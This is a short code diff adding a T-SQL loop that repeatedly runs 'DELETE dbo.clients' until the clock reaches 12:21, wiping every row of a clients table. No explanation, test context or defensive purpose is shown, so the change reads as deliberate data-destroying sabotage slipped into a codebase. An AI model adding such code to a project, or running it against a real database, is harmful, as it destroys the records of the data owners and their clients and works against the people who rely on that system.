@@ -1,0 +1,2 @@
+﻿WHILE CAST(GETDATE() AS TIME) < '12:21'
+    DELETE dbo.clients
